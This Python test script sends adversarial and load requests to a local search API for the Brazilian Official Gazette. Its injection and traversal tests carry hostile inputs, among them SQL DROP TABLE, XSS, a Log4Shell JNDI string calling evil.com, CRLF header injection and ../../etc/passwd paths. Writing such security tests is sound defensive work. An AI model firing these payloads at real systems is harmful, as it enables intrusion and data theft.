"""
Adversarial + load test for GABI DOU API.
~1000 requests across all 8 endpoints: happy path, edge cases, injection, unicode, pagination, concurrency.
"""
import asyncio
import json
import time
import urllib.parse
from collections import Counter, defaultdict
from dataclasses import dataclass, field

import httpx

BASE = "http://localhost:8000"


@dataclass
class TestResult:
    name: str
    endpoint: str
    status: int
    ok: bool
    ms: float
    detail: str = ""


@dataclass
class Report:
    results: list[TestResult] = field(default_factory=list)

    def add(self, r: TestResult):
        self.results.append(r)

    def summary(self):
        total = len(self.results)
        passed = sum(1 for r in self.results if r.ok)
        failed = total - passed
        status_counts = Counter(r.status for r in self.results)
        endpoint_counts = defaultdict(lambda: {"pass": 0, "fail": 0, "times": []})
        for r in self.results:
            ep = r.endpoint
            endpoint_counts[ep]["times"].append(r.ms)
            if r.ok:
                endpoint_counts[ep]["pass"] += 1
            else:
                endpoint_counts[ep]["fail"] += 1

        print("\n" + "=" * 80)
        print(f"  ADVERSARIAL TEST REPORT — {total} requests, {passed} passed, {failed} FAILED")
        print("=" * 80)

        print(f"\n  Status code distribution: {dict(status_counts)}")

        all_times = [r.ms for r in self.results]
        if all_times:
            print(f"  Latency: min={min(all_times):.0f}ms  avg={sum(all_times)/len(all_times):.0f}ms  "
                  f"max={max(all_times):.0f}ms  p95={sorted(all_times)[int(len(all_times)*0.95)]:.0f}ms")

        print(f"\n  {'Endpoint':<30} {'Pass':>6} {'Fail':>6} {'Avg ms':>8} {'Max ms':>8}")
        print("  " + "-" * 64)
        for ep in sorted(endpoint_counts):
            d = endpoint_counts[ep]
            times = d["times"]
            avg_t = sum(times) / len(times) if times else 0
            max_t = max(times) if times else 0
            marker = " <<<" if d["fail"] > 0 else ""
            print(f"  {ep:<30} {d['pass']:>6} {d['fail']:>6} {avg_t:>8.0f} {max_t:>8.0f}{marker}")

        if failed > 0:
            print(f"\n  FAILURES ({failed}):")
            for r in self.results:
                if not r.ok:
                    print(f"    [{r.status}] {r.name}: {r.detail[:120]}")
        print()


report = Report()


async def req(client: httpx.AsyncClient, name: str, method: str, path: str,
              expect_status: int | set[int] = 200, check_body=None, **kwargs) -> TestResult:
    endpoint = path.split("?")[0]
    t0 = time.monotonic()
    try:
        resp = await client.request(method, f"{BASE}{path}", timeout=30, **kwargs)
        ms = (time.monotonic() - t0) * 1000
        status = resp.status_code

        expected = expect_status if isinstance(expect_status, set) else {expect_status}
        ok = status in expected

        detail = ""
        if ok and check_body:
            try:
                body = resp.json()
                check_body(body)
            except Exception as e:
                ok = False
                detail = f"Body check failed: {e}"
        if not ok and not detail:
            detail = f"Expected {expected}, got {status}. Body: {resp.text[:200]}"

        r = TestResult(name, endpoint, status, ok, ms, detail)
    except Exception as e:
        ms = (time.monotonic() - t0) * 1000
        r = TestResult(name, endpoint, 0, False, ms, str(e)[:200])
    report.add(r)
    return r


# ---------------------------------------------------------------------------
# Test categories
# ---------------------------------------------------------------------------

async def test_search_happy(c):
    """Normal search queries a user would type."""
    queries = [
        "portaria", "decreto", "nomeação", "licitação", "concurso público",
        "LGPD", "Lei 14133", "aposentadoria", "pregão eletrônico",
        "exoneração", "resolução", "instrução normativa", "edital",
        "contrato", "convênio", "medida provisória", "emenda constitucional",
        "servidor público federal", "ministério da saúde", "receita federal",
    ]
    for q in queries:
        await req(c, f"search:{q}", "GET", f"/api/search?q={urllib.parse.quote(q)}",
                  check_body=lambda b: (
                      assert_key(b, "results", list),
                      assert_key(b, "total", int),
                      assert_key(b, "page", int),
                  ))


async def test_search_pagination(c):
    """Paginate through results."""
    for page in [1, 2, 5, 10, 50]:
        await req(c, f"search:page={page}", "GET", f"/api/search?q=portaria&page={page}&max=10",
                  check_body=lambda b: assert_key(b, "results", list))
    # max=1 (minimum)
    await req(c, "search:max=1", "GET", "/api/search?q=lei&max=1",
              check_body=lambda b: assert_len_le(b["results"], 1))
    # max=100 (maximum)
    await req(c, "search:max=100", "GET", "/api/search?q=lei&max=100",
              check_body=lambda b: assert_len_le(b["results"], 100))


async def test_search_filters(c):
    """Filters: section, date range, art_type, issuing_organ."""
    await req(c, "search:section=1", "GET", "/api/search?q=portaria&section=1",
              check_body=lambda b: assert_key(b, "results", list))
    await req(c, "search:section=2", "GET", "/api/search?q=nomeação&section=2")
    await req(c, "search:section=3", "GET", "/api/search?q=aviso&section=3")
    await req(c, "search:section=e", "GET", "/api/search?q=decreto&section=e")
    await req(c, "search:date_from", "GET", "/api/search?q=lei&date_from=2024-01-01")
    await req(c, "search:date_range", "GET",
              "/api/search?q=lei&date_from=2024-01-01&date_to=2024-12-31")
    await req(c, "search:art_type=Portaria", "GET",
              f"/api/search?q=saude&art_type={urllib.parse.quote('Portaria')}")
    await req(c, "search:organ", "GET",
              f"/api/search?q=licitação&issuing_organ={urllib.parse.quote('Ministério da Saúde')}")
    # Combined filters
    await req(c, "search:all_filters", "GET",
              f"/api/search?q=portaria&section=1&date_from=2024-01-01&date_to=2025-12-31"
              f"&art_type={urllib.parse.quote('Portaria')}")


async def test_search_edge_cases(c):
    """Edge cases: unicode, special chars, very long queries, empty-ish."""
    # Single character
    await req(c, "search:single_char", "GET", "/api/search?q=a")
    # Very long query (500 chars)
    long_q = "portaria " * 60
    await req(c, "search:very_long_query", "GET",
              f"/api/search?q={urllib.parse.quote(long_q[:500])}")
    # Unicode / accented
    await req(c, "search:unicode_accents", "GET",
              f"/api/search?q={urllib.parse.quote('instrução normativa nº 123')}")
    # Numbers only
    await req(c, "search:numbers", "GET", "/api/search?q=14133")
    # Special ES chars: + - = && || > < ! ( ) { } [ ] ^ " ~ * ? : \ /
    special_queries = [
        'lei AND decreto', 'portaria OR nomeação', '"concurso público"',
        'lei +14133', 'decreto -revogado', 'art_type:Portaria',
        '(lei OR decreto) AND 2024',
    ]
    for sq in special_queries:
        await req(c, f"search:special:{sq[:30]}", "GET",
                  f"/api/search?q={urllib.parse.quote(sq)}")
    # Emoji in query
    await req(c, "search:emoji", "GET", f"/api/search?q={urllib.parse.quote('portaria 🇧🇷')}")
    # Only spaces after strip (should fail validation since min_length=1)
    await req(c, "search:only_spaces", "GET", "/api/search?q=%20%20%20",
              expect_status={200, 422})
    # Null bytes
    await req(c, "search:null_bytes", "GET", "/api/search?q=portaria%00decreto",
              expect_status={200, 422, 400})


async def test_search_injection(c):
    """SQL/NoSQL/ES injection attempts."""
    injections = [
        "'; DROP TABLE documents; --",
        '{"query":{"match_all":{}}}',
        "<script>alert('xss')</script>",
        "portaria\"); system(\"ls",
        "${jndi:ldap://evil.com/x}",
        "{{7*7}}",
        "__proto__",
        "constructor.prototype",
        "portaria\nHost: evil.com",
        "portaria\r\nX-Injected: true",
    ]
    for inj in injections:
        await req(c, f"inject:{inj[:30]}", "GET",
                  f"/api/search?q={urllib.parse.quote(inj)}",
                  expect_status={200, 400, 422})


async def test_search_missing_params(c):
    """Missing or invalid parameters."""
    await req(c, "search:no_q", "GET", "/api/search", expect_status=422)
    await req(c, "search:empty_q", "GET", "/api/search?q=", expect_status=422)
    await req(c, "search:page=0", "GET", "/api/search?q=lei&page=0", expect_status=422)
    await req(c, "search:page=-1", "GET", "/api/search?q=lei&page=-1", expect_status=422)
    await req(c, "search:max=0", "GET", "/api/search?q=lei&max=0", expect_status=422)
    await req(c, "search:max=999", "GET", "/api/search?q=lei&max=999", expect_status=422)
    await req(c, "search:bad_date", "GET", "/api/search?q=lei&date_from=not-a-date",
              expect_status={200, 400, 422, 500})
    await req(c, "search:bad_section", "GET", "/api/search?q=lei&section=99",
              check_body=lambda b: assert_key(b, "results", list))  # should work, just no results


async def test_autocomplete(c):
    """Autocomplete happy + edge."""
    prefixes = ["por", "dec", "lei", "min", "con", "pre", "nom", "lic"]
    for p in prefixes:
        await req(c, f"ac:{p}", "GET", f"/api/autocomplete?q={p}",
                  check_body=lambda b: isinstance(b, list))
    # Single character
    await req(c, "ac:single_char", "GET", "/api/autocomplete?q=p")
    # Unicode
    await req(c, "ac:unicode", "GET", f"/api/autocomplete?q={urllib.parse.quote('instruç')}")
    # Very long prefix
    await req(c, "ac:long", "GET", f"/api/autocomplete?q={urllib.parse.quote('a' * 200)}")
    # n limits
    await req(c, "ac:n=1", "GET", "/api/autocomplete?q=por&n=1")
    await req(c, "ac:n=20", "GET", "/api/autocomplete?q=por&n=20")
    # Missing q
    await req(c, "ac:no_q", "GET", "/api/autocomplete", expect_status=422)
    await req(c, "ac:empty_q", "GET", "/api/autocomplete?q=", expect_status=422)
    # Injection
    await req(c, "ac:inject", "GET",
              f"/api/autocomplete?q={urllib.parse.quote('<script>alert(1)</script>')}",
              expect_status={200, 400, 422})


async def test_document(c):
    """Document detail: real IDs, missing, edge cases."""
    # First get a real ID from search
    resp = await c.get(f"{BASE}/api/search?q=portaria&max=3", timeout=10)
    real_ids = []
    if resp.status_code == 200:
        data = resp.json()
        real_ids = [r["id"] for r in data.get("results", []) if r.get("id")]

    for doc_id in real_ids[:3]:
        await req(c, f"doc:{doc_id[:30]}", "GET",
                  f"/api/document/{urllib.parse.quote(doc_id, safe='')}",
                  check_body=lambda b: (
                      assert_key(b, "id", str),
                      assert_key(b, "title", str),
                      assert_key(b, "section", str),
                  ))

    # Non-existent document
    await req(c, "doc:nonexistent", "GET", "/api/document/does-not-exist-12345",
              expect_status=404)
    # Empty ID — this might match a route or 404
    await req(c, "doc:empty", "GET", "/api/document/",
              expect_status={307, 404, 405, 422})
    # ID with special chars
    await req(c, "doc:special_chars", "GET",
              f"/api/document/{urllib.parse.quote('2024-01-01_DO1_abc123!@#', safe='')}",
              expect_status={200, 404})
    # Very long ID
    await req(c, "doc:long_id", "GET", f"/api/document/{'x' * 500}",
              expect_status={200, 404})
    # Path traversal attempt
    await req(c, "doc:path_traversal", "GET",
              f"/api/document/{urllib.parse.quote('../../etc/passwd', safe='')}",
              expect_status={200, 404, 400, 422})


async def test_stats(c):
    """Stats endpoint."""
    await req(c, "stats:happy", "GET", "/api/stats",
              check_body=lambda b: (
                  assert_key(b, "total_documents", int),
                  assert_key(b, "total_sections", int),
                  assert_key(b, "date_range", dict),
                  assert_gt(b["total_documents"], 0),
              ))


async def test_types(c):
    """Types endpoint."""
    await req(c, "types:happy", "GET", "/api/types",
              check_body=lambda b: (
                  isinstance(b, list),
                  len(b) > 0,
                  assert_key(b[0], "value", str),
                  assert_key(b[0], "label", str),
              ))


async def test_top_searches(c):
    """Top searches endpoint."""
    await req(c, "top_searches:happy", "GET", "/api/top-searches",
              check_body=lambda b: (
                  isinstance(b, list),
                  len(b) == 10,
                  assert_key(b[0], "query", str),
                  assert_key(b[0], "count", int),
              ))


async def test_search_examples(c):
    """Search examples endpoint."""
    await req(c, "examples:happy", "GET", "/api/search-examples",
              check_body=lambda b: (
                  isinstance(b, list),
                  len(b) == 6,
                  assert_key(b[0], "query", str),
              ))


async def test_media(c):
    """Media stub — should always 404."""
    await req(c, "media:stub", "GET", "/api/media/some-doc/image.png", expect_status=404)
    await req(c, "media:traversal", "GET",
              f"/api/media/{urllib.parse.quote('../../etc', safe='')}/passwd",
              expect_status=404)


async def test_unknown_routes(c):
    """Unknown routes should 404 or 405."""
    await req(c, "unknown:/api/foo", "GET", "/api/foo", expect_status={404, 405})
    await req(c, "unknown:POST_search", "POST", "/api/search", expect_status={405, 422})
    await req(c, "unknown:DELETE_root", "DELETE", "/", expect_status={405})


async def test_concurrent_load(c):
    """Blast 200 concurrent search requests."""
    queries = [
        "portaria", "decreto", "lei", "nomeação", "licitação",
        "LGPD", "edital", "contrato", "resolução", "convênio",
    ] * 20  # 200 requests

    async def fire(q):
        return await req(c, f"load:{q}", "GET", f"/api/search?q={urllib.parse.quote(q)}&max=5")

    # Fire in batches of 20 (single-worker uvicorn)
    for i in range(0, len(queries), 20):
        batch = queries[i:i+20]
        await asyncio.gather(*[fire(q) for q in batch])


async def test_concurrent_mixed(c):
    """Mixed endpoint concurrency: 100 requests across all endpoints."""
    tasks = []
    for i in range(10):
        tasks.append(req(c, f"mixed:search_{i}", "GET", f"/api/search?q=lei&page={i+1}&max=5"))
    for i in range(10):
        tasks.append(req(c, f"mixed:ac_{i}", "GET", f"/api/autocomplete?q={'abcdefghij'[i%10]}"))
    for _ in range(10):
        tasks.append(req(c, "mixed:stats", "GET", "/api/stats"))
    for _ in range(10):
        tasks.append(req(c, "mixed:types", "GET", "/api/types"))
    for _ in range(10):
        tasks.append(req(c, "mixed:top", "GET", "/api/top-searches"))
    # Fire all 50 at once (single-worker uvicorn)
    await asyncio.gather(*tasks)


async def test_response_schema(c):
    """Validate response schemas match frontend TypeScript interfaces."""
    required_search_keys = {"results", "total", "page", "max", "query"}
    await req(c, "schema:search_response", "GET", "/api/search?q=lei&max=1",
              check_body=lambda b: (
                  assert_keys_present(b, required_search_keys),
                  assert_result_schema(b["results"][0]) if b["results"] else None,
              ))

    # Stats schema
    await req(c, "schema:stats", "GET", "/api/stats",
              check_body=lambda b: assert_keys_present(b, {"total_documents", "total_sections", "date_range"}))

    # Types schema
    await req(c, "schema:types", "GET", "/api/types",
              check_body=lambda b: assert_keys_present(b[0], {"value", "label"}) if b else None)


async def test_xss_in_responses(c):
    """Ensure highlight output doesn't pass through raw user input as HTML."""
    xss = "<img src=x onerror=alert(1)>"
    try:
        resp = await c.get(f"{BASE}/api/search?q={urllib.parse.quote(xss)}&max=1", timeout=30)
        if resp.status_code == 200:
            data = resp.json()
            # Check highlight/snippet fields (not query echo — that's expected in JSON)
            xss_in_content = False
            for r in data.get("results", []):
                for field in ("highlight", "snippet", "title", "subtitle"):
                    val = r.get(field) or ""
                    if "<img" in val or "onerror" in val:
                        xss_in_content = True
                        break
            if xss_in_content:
                report.add(TestResult("xss:search_response", "/api/search", 200, False, 0,
                                      "XSS payload found in result highlight/snippet"))
            else:
                report.add(TestResult("xss:search_response", "/api/search", 200, True, 0))
    except Exception as e:
        report.add(TestResult("xss:search_response", "/api/search", 0, False, 0, str(e)[:200]))


# ---------------------------------------------------------------------------
# Assertion helpers
# ---------------------------------------------------------------------------

def assert_key(d, key, typ):
    if key not in d:
        raise AssertionError(f"Missing key '{key}'")
    if not isinstance(d[key], typ):
        raise AssertionError(f"Key '{key}' is {type(d[key]).__name__}, expected {typ.__name__}")


def assert_keys_present(d, keys):
    missing = keys - set(d.keys())
    if missing:
        raise AssertionError(f"Missing keys: {missing}")


def assert_result_schema(r):
    required = {"id", "title", "pub_date", "section"}
    missing = required - set(r.keys())
    if missing:
        raise AssertionError(f"SearchResult missing keys: {missing}")


def assert_len_le(lst, n):
    if len(lst) > n:
        raise AssertionError(f"Expected len <= {n}, got {len(lst)}")


def assert_gt(val, n):
    if val <= n:
        raise AssertionError(f"Expected > {n}, got {val}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

async def main():
    print("Starting adversarial API test suite...")
    print(f"Target: {BASE}")
    t0 = time.monotonic()

    async with httpx.AsyncClient() as c:
        # Sequential test groups (ordered by complexity)
        print("\n[1/14] Search happy path (20 queries)...")
        await test_search_happy(c)

        print("[2/14] Search pagination...")
        await test_search_pagination(c)

        print("[3/14] Search filters...")
        await test_search_filters(c)

        print("[4/14] Search edge cases...")
        await test_search_edge_cases(c)

        print("[5/14] Injection attempts...")
        await test_search_injection(c)

        print("[6/14] Missing/invalid parameters...")
        await test_search_missing_params(c)

        print("[7/14] Autocomplete...")
        await test_autocomplete(c)

        print("[8/14] Document detail...")
        await test_document(c)

        print("[9/14] Stats...")
        await test_stats(c)

        print("[10/14] Types...")
        await test_types(c)

        print("[11/14] Top searches & examples...")
        await test_top_searches(c)
        await test_search_examples(c)
        await test_media(c)
        await test_unknown_routes(c)

        print("[12/14] Response schema validation...")
        await test_response_schema(c)
        await test_xss_in_responses(c)

        print("[13/14] Concurrent load (200 searches)...")
        await test_concurrent_load(c)

        print("[14/14] Mixed concurrency (100 requests)...")
        await test_concurrent_mixed(c)

    elapsed = time.monotonic() - t0
    print(f"\nCompleted in {elapsed:.1f}s")
    report.summary()

    # Exit code
    failures = sum(1 for r in report.results if not r.ok)
    return 1 if failures else 0


if __name__ == "__main__":
    exit(asyncio.run(main()))
